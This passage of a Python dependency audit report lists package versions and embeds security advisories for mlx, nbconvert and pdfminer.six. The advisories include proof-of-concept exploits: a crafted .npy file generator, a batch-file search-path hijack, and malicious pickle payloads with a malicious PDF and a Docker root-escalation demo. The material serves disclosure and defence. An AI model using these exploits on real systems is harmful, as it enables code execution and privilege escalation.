"vulns": []}, {"name": "lxml", "version": "6.0.1", "vulns": []}, {"name": "manim", "version": "0.19.1", "vulns": []}, {"name": "manimpango", "version": "0.6.1", "vulns": []}, {"name": "mapbox-earcut", "version": "2.0.0", "vulns": []}, {"name": "markdown", "version": "3.10", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.2", "vulns": []}, {"name": "matplotlib", "version": "3.10.5", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.7", "vulns": []}, {"name": "mbstrdecoder", "version": "1.1.4", "vulns": []}, {"name": "mcp", "version": "1.23.1", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.5.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "mi-experimenter", "skip_reason": "Dependency not found on PyPI and could not be audited: mi-experimenter (0.1.0)"}, {"name": "mistune", "version": "3.1.4", "vulns": []}, {"name": "mlx", "version": "0.29.3", "vulns": [{"id": "CVE-2025-62609", "fix_versions": ["0.29.4"], "aliases": ["GHSA-j842-xgm4-wf88"], "description": "## Summary  Segmentation fault in `mlx::core::load_gguf()` when loading malicious GGUF files. Untrusted pointer from external gguflib library is dereferenced without validation, causing application crash.  Environment: - OS: Ubuntu 20.04.6 LTS - Compiler: Clang 19.1.7  ## Vulnerability  **Location**: `mlx/io/gguf.cpp` - Function `extract_tensor_data()` at lines 59-79 - Vulnerable memcpy at lines 64-67 - Called from `load_arrays()` at line 177  **The Bug**: ```cpp std::tuple<allocator::Buffer, Dtype> extract_tensor_data(gguf_tensor* tensor) {   std::optional<Dtype> equivalent_dtype = gguf_type_to_dtype(tensor->type);   if (equivalent_dtype.has_value()) {     allocator::Buffer buffer = allocator::malloc(tensor->bsize);     memcpy(         buffer.raw_ptr(),         tensor->weights_data,  // untrusted pointer from gguflib         tensor->num_weights * equivalent_dtype.value().size());     return {buffer, equivalent_dtype.value()};   }   // ... } ```  ## Possible Fix  ```cpp std::tuple<allocator::Buffer, Dtype> extract_tensor_data(gguf_tensor* tensor) {   std::optional<Dtype> equivalent_dtype = gguf_type_to_dtype(tensor->type);   if (equivalent_dtype.has_value()) {     // FIX: Validate pointer     if (!tensor->weights_data) {       throw std::runtime_error(\"[load_gguf] NULL tensor data pointer\");     }      allocator::Buffer buffer = allocator::malloc(tensor->bsize);     memcpy(         buffer.raw_ptr(),         tensor->weights_data,         tensor->num_weights * equivalent_dtype.value().size());     return {buffer, equivalent_dtype.value()};   }   // ... } ```  ## PoC  ```bash # Install MLX pip install mlx  python3 -c \"import mlx.core as mx; mx.load('exploit.gguf', format='gguf')\" ```  Download the poc file [there](https://drive.google.com/file/d/1t9Z2RJGn-oHmluKWebU077UWSMGXeuVp/view?usp=sharing), or let me know how I can send it to you.  **AddressSanitizer Output (with instrumented build)**: ``` AddressSanitizer:DEADLYSIGNAL ================================================================= ==5855==ERROR: AddressSanitizer: SEGV on unknown address 0x7fc432f64bc0 (pc 0x7fc430841c12 bp 0x7ffc04847ab0 sp 0x7ffc04847268 T0) ==5855==The signal is caused by a READ memory access.     #0 0x7fc430841c12  /build/glibc-B3wQXB/glibc-2.31/string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:312     #1 0x55aac829756b in __asan_memcpy (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x9ef56b) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)     #2 0x55aacaa6e8dc in mlx::core::extract_tensor_data(gguf_tensor*) /home/user1/mlx/mlx/io/gguf.cpp:64:5     #3 0x55aacaa773fc in mlx::core::load_arrays[abi:cxx11](gguf_ctx*) /home/user1/mlx/mlx/io/gguf.cpp:226:35     #4 0x55aacaa782a9 in mlx::core::load_gguf(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/gguf.cpp:250:17     #5 0x55aac82dc696 in LLVMFuzzerTestOneInput /home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf.cpp:49:19     #6 0x55aac81e25c6 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x93a5c6) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)     #7 0x55aac81cc738 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x924738) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)     #8 0x55aac81d220a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x92a20a) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)     #9 0x55aac81fbb82 in main (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x953b82) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)     #10 0x7fc4307aa082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16     #11 0x55aac81c73ed in _start (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x91f3ed) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)  ==5855==Register values: rax = 0x0000502000000098  rbx = 0xfafafafa0000fa00  rcx = 0x00000a047fff8013  rdx = 0x0000000000000008 rdi = 0x0000502000000098  rsi = 0x00007fc432f64bc0  rbp = 0x00007ffc04847ab0  rsp = 0x00007ffc04847268  r8 = 0x00000a0400000013   r9 = 0x0000000000000000  r10 = 0x00000a0400000013  r11 = 0x0000000000000000 r12 = 0x00000a047fff8010  r13 = 0xffffffffffffffc7  r14 = 0x00007fc42dd00280  r15 = 0x00000ff885ba0050 AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /build/glibc-B3wQXB/glibc-2.31/string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:312 ==5855==ABORTING ```  ## Impact  - **Attack vector**: Malicious GGUF file (model weights, typically from untrusted sources) - **Affects**: MLX users on all platforms who call the vulnerable method with unsanitized input. - **Result**: Segmentation fault (uncatchable by exception handlers)  --- Credits:  - Markiyan Melnyk (ARIMLABS) - Mykyta Mudryi (ARIMLABS) - Markiyan Chaklosh (ARIMLABS)"}, {"id": "CVE-2025-62608", "fix_versions": ["0.29.4"], "aliases": ["GHSA-w6vg-jg77-2qg6"], "description": "## Summary  Heap buffer overflow in `mlx::core::load()` when parsing malicious NumPy `.npy` files. Attacker-controlled file causes 13-byte out-of-bounds read, leading to crash or information disclosure.  Environment: - OS: Ubuntu 20.04.6 LTS - Compiler: Clang 19.1.7  ## Vulnerability  The parser reads a 118-byte header from the file, but line 268 uses `std::string(&buffer[0])` which stops at the first null byte, creating a 20-byte string instead. Then line 276 tries to read `header[34]` without checking the length first, reading 13 bytes past the allocation.  **Location**: `mlx/io/load.cpp:268,276`  **Bug #1** (line 268): ```cpp std::string header(&buffer[0]);  // stops at first null byte ```  **Bug #2** (line 276): ```cpp bool col_contiguous = header[34] == 'T';  // No bounds check ```  ## Possible Fix  ```cpp // Line 268 std::string header(&buffer[0], header_len);  // Line 276 if (header.length() < 35) throw std::runtime_error(\"Malformed header\"); ```  ## PoC  ```bash pip install mlx  # generate exploit cat > exploit.py << 'EOF' import struct magic = b'\\x93NUMPY' version = b'\\x01\\x00' header = b\"{'descr': '<u2', 'fo\\x00\\x00\\x00\\x00n_order': False, 'shape': (3,), }\" header += b' ' * (118 - len(header) - 1) + b'\\n' with open('exploit.npy', 'wb') as f:     f.write(magic + version + struct.pack('<H', 118) + header + b'\\x00\\x00\\x00\\x80\\xff\\xff') EOF python3 exploit.py  python3 -c \"import mlx.core as mx; mx.load('exploit.npy')\" ```  **AddressSanitizer Output (with instrumented build)**: ``` ================================================================= ==3179==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000152 at pc 0x563345697c29 bp 0x7ffeb8ad0a50 sp 0x7ffeb8ad0a48 READ of size 1 at 0x503000000152 thread T0     #0 0x563345697c28 in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:276:25     #1 0x563345698da1 in mlx::core::load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:328:10     #2 0x563342f001bf in main /home/user1/mlx/fuzz/load/poc_crash.cpp:69:20     #3 0x7fbd4692c082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16     #4 0x563342e1f1cd in _start (/home/user1/mlx/fuzz/load/poc_crash+0x9181cd) (BuildId: ce2b741b3a71c93540a7ed76bc47e88952cd3099)  0x503000000152 is located 13 bytes after 21-byte region [0x503000000130,0x503000000145) allocated by thread T0 here:     #0 0x563342efd66d in operator new(unsigned long) (/home/user1/mlx/fuzz/load/poc_crash+0x9f666d) (BuildId: ce2b741b3a71c93540a7ed76bc47e88952cd3099)     #1 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct<char const*>(char const*, char const*, std::forward_iterator_tag) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.tcc:219:14     #2 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct_aux<char const*>(char const*, char const*, std::__false_type) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:251:11     #3 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct<char const*>(char const*, char const*) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:270:4     #4 0x5633456956fe in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::basic_string<std::allocator<char>>(char const*, std::allocator<char> const&) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:531:9     #5 0x5633456956fe in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:268:15     #6 0x563345698da1 in mlx::core::load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:328:10     #7 0x563342f001bf in main /home/user1/mlx/fuzz/load/poc_crash.cpp:69:20     #8 0x7fbd4692c082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16  SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user1/mlx/mlx/io/load.cpp:276:25 in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) Shadow bytes around the buggy address:   0x502ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x502fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x502fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x503000000000: fa fa 00 00 04 fa fa fa 00 00 00 00 fa fa 00 00   0x503000000080: 00 00 fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa =>0x503000000100: 00 00 00 fa fa fa 00 00 05 fa[fa]fa fa fa fa fa   0x503000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x503000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x503000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x503000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x503000000380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==3179==ABORTING ```  ## Impact  - **Attack vector**: Malicious `.npy` file (model weights, datasets, checkpoints) - **Affects**: MLX users on all platforms who call the vulnerable methods with unsanitized input. - **Result**: Application crash + potential 13-byte heap leak   ---  Credits: - Markiyan Melnyk (ARIMLABS) - Mykyta Mudryi (ARIMLABS) - Markiyan Chaklosh (ARIMLABS)"}]}, {"name": "mlx-lm", "version": "0.28.3", "vulns": []}, {"name": "mlx-metal", "version": "0.29.3", "vulns": []}, {"name": "mmh3", "version": "5.2.0", "vulns": []}, {"name": "moderngl", "version": "5.12.0", "vulns": []}, {"name": "moderngl-window", "version": "3.1.1", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.7.0", "vulns": []}, {"name": "multiprocess", "version": "0.70.18", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "narwhals", "version": "2.15.0", "vulns": []}, {"name": "nbclient", "version": "0.10.2", "vulns": []}, {"name": "nbconvert", "version": "7.16.6", "vulns": [{"id": "CVE-2025-53000", "fix_versions": [], "aliases": ["GHSA-xm59-rqc7-hhvf"], "description": "### Summary  On Windows, converting a notebook containing SVG output to a PDF results in unauthorized code execution. Specifically, a third party can create a `inkscape.bat` file that defines a [Windows batch script](https://en.wikipedia.org/wiki/Batch_file), capable of arbitrary code execution.  When a user runs `jupyter nbconvert --to pdf` on a notebook containing SVG output to a PDF on a Windows platform from this directory, the `inkscape.bat` file is run unexpectedly.  ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  `nbconvert` searches for an `inkscape` executable when converting notebooks to PDFs here: https://github.com/jupyter/nbconvert/blob/4f61702f5c7524d8a3c4ac0d5fc33a6ac2fa36a7/nbconvert/preprocessors/svg2pdf.py#L104  The MITRE page on [CWE-427 (Uncontrolled Search Path Element)](https://cwe.mitre.org/data/definitions/427.html) summarizes the root cause succinctly:  > In Windows-based systems, when the `LoadLibrary` or `LoadLibraryEx` function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled: > - the directory from which the program has been loaded > - the current working directory  ### PoC  _Complete instructions, including specific configuration details, to reproduce the vulnerability._  1. Create a directory containing:       - A hidden bat file called `inkscape.bat` containing `msg * \"You've been hacked!\"`      - A dummy ipynb file called `Machine_Learning.ipynb`  2. Run the command `jupyter nbconvert --to pdf Machine_Learning.ipynb`.  3. Wait a few seconds, and you should see a popup showing the message \"You've been hacked!\"   ### Impact  All Windows users."}]}, {"name": "nbformat", "version": "5.10.4", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "nest-asyncio2", "version": "1.7.1", "vulns": []}, {"name": "networkx", "version": "3.5", "vulns": []}, {"name": "nltk", "version": "3.9.1", "vulns": []}, {"name": "nodeenv", "version": "1.10.0", "vulns": []}, {"name": "notebook", "version": "7.4.7", "vulns": []}, {"name": "notebook-shim", "version": "0.2.4", "vulns": []}, {"name": "numpy", "version": "2.2.6", "vulns": []}, {"name": "ocrmypdf", "version": "16.4.0", "vulns": []}, {"name": "ollama", "version": "0.5.1", "vulns": []}, {"name": "openai", "version": "1.100.2", "vulns": []}, {"name": "opencv-python", "version": "4.12.0.88", "vulns": []}, {"name": "orjson", "version": "3.11.5", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pandas", "version": "2.3.3", "vulns": []}, {"name": "pandoc", "version": "2.4", "vulns": []}, {"name": "pandocfilters", "version": "1.5.1", "vulns": []}, {"name": "paramiko", "version": "4.0.0", "vulns": []}, {"name": "parso", "version": "0.8.5", "vulns": []}, {"name": "pathlib-abc", "version": "0.5.2", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "pathvalidate", "version": "3.3.1", "vulns": []}, {"name": "patsy", "version": "1.0.2", "vulns": []}, {"name": "pdf2image", "version": "1.17.0", "vulns": []}, {"name": "pdfminer-six", "version": "20250506", "vulns": [{"id": "CVE-2025-64512", "fix_versions": ["20251107"], "aliases": ["GHSA-wf5f-4jwr-ppcp"], "description": "### Summary  pdfminer.six will execute arbitrary code from a malicious pickle file if provided with a malicious PDF file. The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed.  ### Details  ```python # Vulnerable code in pdfminer/cmapdb.py:233-246 def _load_data(cls, name: str) -> Any:     name = name.replace(\"\\0\", \"\")  # Insufficient sanitization     filename = \"%s.pickle.gz\" % name     # ... path construction ...     path = os.path.join(directory, filename) # If filename is an absolte path, directory is ignored     # ...     return type(str(name), (), pickle.loads(gzfile.read()))  # Unsafe deserialization ```  An attacker can: 1. Create a malicious PDF with a CMap reference like `/malicious` 2. Place a malicious pickle file at `/malicious.pickle.gz` 3. When the PDF is processed, pdfminer loads and deserializes the malicious pickle 4. The pickle deserialization can execute arbitrary Python code  ### POC  #### Malicious PDF  Create a PDF with a malicious CMAP entry:  ``` 5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj ```  Here the /Encoding points to `/pdfs/malicious`. Pdfminer will append the extension `.pickle.gz` to this filename. Place the PDF in a file called `/pdfs/malicious.pdf`.  #### Malicious Pickle  Create a malicious, zipped pickle to execute. For example, with this Python script:  ```python #!/usr/bin/env python3 import pickle import gzip  def create_demo_pickle():     print(\"Creating demonstration pickle file...\")      # Create payload that executes code AND returns a dict (as pdfminer expects)     class EvilPayload:         def __reduce__(self):             # This function will be called during unpickling             code = \"print('Malicious code executed.') or exit(0) or {}\"             return (eval, (code,))      demo_cmap_data = EvilPayload()      # Create the pickle file that the path traversal would access     target_path = \"./malicious.pickle.gz\"      try:         with gzip.open(target_path, 'wb') as f:             pickle.dump(demo_cmap_data, f)         print(f\"\u2713 Created demonstration pickle file: {target_path}\")         return target_path      except Exception as e:         print(f\"\u2717 Error creating pickle file: {e}\")         return None  if __name__ == \"__main__\":     create_demo_pickle() ```  This will create a harmless, zipped pickle file that will display \"Malicious code eecuted.\" then exit when deserialized. Put the file in `/pdfs/malicious.pickle.gz`.  #### Test  Install pdfminer.six and run `pdf2text.py /pdfs/malicious.pdf`. Instead of processing the PDF as normal you should see the output:  ``` $ pdf2txt.py malicious.pdf Malicious code executed! ```  ### Impact  If pdfminer.six processes a malicious PDF which points to a zipped pickle file under the control of an attacker the result is arbitrary code execution on the victim's system. An attacker could execute the Python code of their chosing with the permissions of the process running pdfminer.six.  The difficulty in achieving this depends on the OS, see below.  #### Linux, MacOS - harder to exploit  On Linux-like systems only files on the filesystem can be resolved. An attacker would need to provide the malicious PDF for processing *and* the malicious pickle file would need to be present on the target system in a location that the attacker already knows, since it needs to be set in the PDF itself. In many cases this will be difficult to exploit because even if the attacker provides both the PDF and the pickle file together, there would be no way to know in advance which full path to the pickle file to specify. In many cases this would make exploitation difficult or impossible. However:  * An attacker may find a way to write files to a known location on the target system or * The system in question may, by design, read files from a known location such as a network share designated for PDF ingestion.  Overall, there is generally less risk on a Linux or Linux-like system.  #### Windows - easier to exploit  Windows paths can specify network locations e.g. WebDAV, SMB. This means that an attacker could host the malicious pickle remotely and specify a path to the it in the PDF. Since there is no need to get the malicious pickle file on to the target system, exploitation is easier on a Windows OS.  ### Appendix  A complete, malicious PDF is provided here. A dockerized POC is available upon request.  ``` %PDF-1.4 1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj  2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj  3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >> endobj  4 0 obj << /Length 44 >> stream BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET endstream endobj  5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj  6 0 obj << /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >> endobj  7 0 obj << /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >> endobj  xref 0 8 0000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000274 00000 n 0000000370 00000 n 0000000503 00000 n 0000000673 00000 n trailer << /Size 8 /Root 1 0 R >> startxref 871 %%EOF ```"}, {"id": "GHSA-f83h-ghpp-7wcc", "fix_versions": ["20251230"], "aliases": [], "description": "### \ud83d\ude80 Overview  This report **demonstrates a real-world privilege escalation** vulnerability in [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due to unsafe usage of Python's `pickle` module for CMap file loading. It shows how a low-privileged user can gain root access (or escalate to any service account) by exploiting insecure deserialization in a typical multi-user or server environment.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udea8 Special Note  This advisory addresses a distinct vulnerability from [GHSA-wf5f-4jwr-ppcp (CVE-2025-64512)](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp).  While the previous CVE claims to mitigate issues related to unsafe deserialization, the patch introduced in commit [b808ee05dd7f0c8ea8ec34bdf394d40e63501086](https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086) does not address the vulnerability reported here.  Based on testing performed against the latest version of the library ([comparison view](https://github.com/pdfminer/pdfminer.six/compare/20250506...20251107)), the issue remains exploitable through local privilege escalation due to continued unsafe use of pickle files. The **Dockerfile** is hence modified to run test against this claim.  This demonstrates that the patch for **CVE-2025-64512** is incomplete: the vulnerability remains exploitable. This advisory therefore documents a distinct, independently fixable flaw. A correct remediation must remove the dependency on pickle files (or otherwise eliminate unsafe deserialization) and replace it with a safe, auditable data-handling approach so the library can operate normally without relying on ```pickle```  ## \ud83d\udcda Table of Contents  - [\ud83d\udd0d Background](#-background) - [\ud83d\udc0d Vulnerability Description](#-vulnerability-description) - [\ud83c\udfad Demo Scenario](#-demo-scenario) - [\ud83e\udde8 Technical Details](#-technical-details) - [\ud83d\udd27 Setup and Usage](#-setup-and-usage) - [\ud83d\udcdd Step-by-step Walkthrough](#-step-by-step-walkthrough) - [\ud83d\udee1\ufe0f Security Standards & References](#-security-standards--references) ---  ## \ud83d\udd0d Background  **pdfminer.six** is a popular Python library for extracting text and information from PDF files. It supports CJK (Chinese, Japanese, Korean) fonts via external CMap files, which it loads from disk using Python's `pickle` module.  > \ud83d\udc0d **Security Issue:** > If the CMap search path (`CMAP_PATH` or default directories) includes a world-writable or user-writable directory, an attacker can place a malicious `.pickle.gz` file that will be loaded and deserialized by pdfminer.six, leading to arbitrary code execution.  ---  ### \ud83d\udc0d Vulnerability Description  - **Component:** pdfminer.six CMap loading (`pdfminer/cmapdb.py`) - **Issue:** Loads and deserializes `.pickle.gz` files using Python\u2019s `pickle` module, which is unsafe for untrusted data. - **Exploitability:** If a low-privileged user can write to any directory in `CMAP_PATH`, they can execute code as the user running pdfminer\u2014potentially root or a privileged service. - **Impact:** Full code execution as the service user, privilege escalation from user to root, persistence, and potential lateral movement.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif) ### \ud83c\udfad Demo Scenario  **Environment:** - \ud83d\udc27 Alpine Linux (Docker container) - \ud83d\udc68\u200d\ud83d\udcbb Two users:   - `user1` (attacker: low-privilege)   - `root` (victim: runs privileged PDF-processing script) - \ud83d\uddc2\ufe0f Shared writable directory: `/tmp/uploads` - \ud83d\udee3\ufe0f `CMAP_PATH` set to `/tmp/uploads` for the privileged script - \ud83d\udce6 pdfminer.six installed system-wide  **Attack Flow:** 1. \ud83d\udd75\ufe0f\u200d\u2642\ufe0f `user1` creates a malicious CMap file (`Evil.pickle.gz`) in `/tmp/uploads`. 2. \ud83d\udc51 The privileged service (`root`) processes a PDF or calls `get_cmap(\"Evil\")`. 3. \ud83d\udca3 The malicious pickle is deserialized, running arbitrary code as root. 4. \ud83c\udfaf The exploit creates a flag file in `/root/pwnedByPdfminer` as proof.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ### \ud83e\udde8 Technical Details  - **Vulnerability Type:** Insecure deserialization of untrusted data using Python's `pickle` - **Attack Prerequisites:** Attacker can write to a directory included in `CMAP_PATH` - **Vulnerable Line:**   ```python   return type(str(name), (), pickle.loads(gzfile.read()))   ```   *In `pdfminer/cmapdb.py`'s `_load_data` method* - https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfminer/cmapdb.py#L246 - **Proof of Concept:** See `createEvilPickle.py`, `evilmod.py`, and `processPdf.py`  **Exploit Chain:** - Attacker places a malicious `.pickle.gz` file in the CMap search path. - Privileged process (e.g., root) loads a CMap, triggering pickle deserialization. - Arbitrary code executes with the privilege of the process (root/service account).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udd27 Setup and Usage  ### \ud83d\udcc1 Files #### </> Dockerfile ```yml FROM python:3.11-alpine  ARG PM_COMMIT=b808ee05dd7f0c8ea8ec34bdf394d40e63501086  # Install git and build tooling RUN apk add --no-cache git build-base  WORKDIR /opt  # Clone pdfminer.six and check out the specific commit, then install from source RUN git clone https://github.com/pdfminer/pdfminer.six.git && \\     cd pdfminer.six && \\     git fetch --all && \\     git checkout ${PM_COMMIT} && \\     pip install --no-cache-dir -e .  # App working directory for PoC WORKDIR /app  # Create low-privilege user and uploads dir RUN adduser -D user1 && \\     mkdir -p /tmp/uploads && \\     chown user1:user1 /tmp/uploads && \\     chmod 1777 /tmp/uploads  # Copy PoC files COPY evilmod.py /app/evilmod.py COPY createEvilPickle.py /app/createEvilPickle.py COPY processPDF.py /app/processPDF.py  ENV CMAP_PATH=/tmp/uploads ENV PYTHONUNBUFFERED=1  # Keep the container running in background so you can exec into it anytime. CMD [\"tail\", \"-f\", \"/dev/null\"]  ```  #### </> evilmod.py ```python import os  def evilFunc():     with open(\"/root/pwnedByPdfminer\", \"w\") as f:         f.write(\"ROOTED by pdfminer pickle RCE\\n\")     return {\"CODE2CID\": {}, \"IS_VERTICAL\": False} ``` #### </> createEvilPickle.py ```python import pickle import gzip from evilmod import evilFunc  class Evil:     def __reduce__(self):         return (evilFunc, ())  payload = pickle.dumps(Evil()) with gzip.open(\"/tmp/uploads/Evil.pickle.gz\", \"wb\") as f:     f.write(payload)  print(\"Malicious pickle created at /tmp/uploads/Evil.pickle.gz\") ``` #### </> processPDF.py ```python import os from pdfminer.cmapdb import CMapDB  os.environ[\"CMAP_PATH\"] = \"/tmp/uploads\"  CMapDB.get_cmap(\"Evil\")  print(\"CMap loaded. If vulnerable, /root/pwnedByPdfminer will be created.\") ``` ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ### 1\ufe0f\u20e3 Build and start the demo container  ```bash docker build -t pdfminer-priv-esc-demo . docker run --rm -it --name pdfminer-demo pdfminer-priv-esc-democ ```  ### 2\ufe0f\u20e3 In the container, open two shells in parallel (or switch users in one):  #### \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Shell 1 (Attacker: user1) ```bash su user1 cd /app python createEvilPickle.py # \u2705 Confirms: /tmp/uploads/Evil.pickle.gz is created and owned by user1 ```  #### \ud83d\udc51 Shell 2 (Victim: root) ```bash cd /app python processPdf.py # \ud83c\udfaf Output: If vulnerable, /root/pwnedByPdfminer will be created ```  ### 3\ufe0f\u20e3 Proof of escalation  ```bash cat /root/pwnedByPdfminer # \ud83c\udff4 Output: ROOTED by pdfminer pickle RCE ```  <img width=\"815\" height=\"889\" alt=\"proof-of-exploit\" src=\"https://github.com/user-attachments/assets/f465d17c-a3af-49c5-9dbc-eec9635b36fc\" />  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udcdd Step-by-step Walkthrough  1. **user1** uses `createEvilPickle.py` to craft and place a malicious CMap pickle in a shared upload directory. 2. The **root** user runs a typical PDF-processing script, which loads CMap files from that directory. 3. The exploit triggers, running arbitrary code as root. 4. The attacker now has proof of code execution as root (and, in a real attack, could escalate further).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udee1\ufe0f Security Standards & References  - **CVSS (Common Vulnerability Scoring System):**   - **Base Score:** 7.8 (High)   - **Vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  - **OWASP Top 10:**   - [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)   - [A03:2021 - 